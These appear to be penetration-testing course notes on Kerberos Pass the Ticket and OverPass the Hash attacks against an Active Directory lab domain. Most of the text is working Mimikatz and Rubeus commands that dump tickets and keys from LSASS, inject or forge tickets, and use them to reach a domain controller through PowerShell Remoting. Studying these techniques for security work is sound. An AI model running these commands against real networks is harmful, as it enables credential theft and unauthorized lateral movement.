
Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash

## [[Kerberos]]


## Pass the Ticket (PtT) Attack

- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.

- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

## Harvesting Kerberos Tickets from Windows

On Windows, tickets are processed and stored by the **LSASS (Local Security Authority Subsystem Service)** process.

`Mimikatz` module `sekurlsa::tickets /export`

#### Mimikatz - Export Tickets

```cmd-session
mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::tickets /export
```

.kirbi files have tickets

The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory.

 User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.

Service `krbtgt` -> TGT of that account

**Note:** At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.

#### Rubeus - Export Tickets

```cmd-session
Rubeus.exe dump /nowrap
```

To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

---

## Pass the Key or OverPass the Hash

developed by Benjamin Delpy and Skip Duckwall in their presentation [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also [Will Schroeder](https://twitter.com/harmj0y) adapted their project to create the [Rubeus](https://github.com/GhostPack/Rubeus) tool.

#### Mimikatz - Extract Kerberos Keys

```cmd-session
 mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::ekeys
```

#### Mimikatz - Pass the Key or OverPass the Hash

```cmd-session
mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

#### Rubeus - Pass the Key or OverPass the Hash

```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).

---

## Pass the Ticket (PtT)


#### Rubeus Pass the Ticket

```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```


#### Rubeus - Pass the Ticket

```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

#### Convert .kirbi to Base64 Format

```powershell-session

[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```


#### Pass the Ticket - Base64 Format

```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```





#### Mimikatz - Pass the Ticket

```cmd-session
mimikatz.exe 
```

```cmd-session
privilege::debug
```

```cmd-session

kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

```cmd-session

kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

**Note:** Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

## Pass The Ticket with PowerShell Remoting (Windows)

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer.

Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.



## Mimikatz - PowerShell Remoting with Pass the Ticket
#### Mimikatz - Pass the Ticket for Lateral Movement.

```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```

```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```cmd-session
powershell
```

```cmd-session
Enter-PSSession -ComputerName DC01
```


## Rubeus - PowerShell Remoting with Pass the Ticket

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

#### Create a Sacrificial Process with Rubeus

```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

#### Rubeus - Pass the Ticket for Lateral Movement

```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

```cmd-session
powershell
```

```cmd-session
Enter-PSSession -ComputerName DC01
```

## Practice Labs












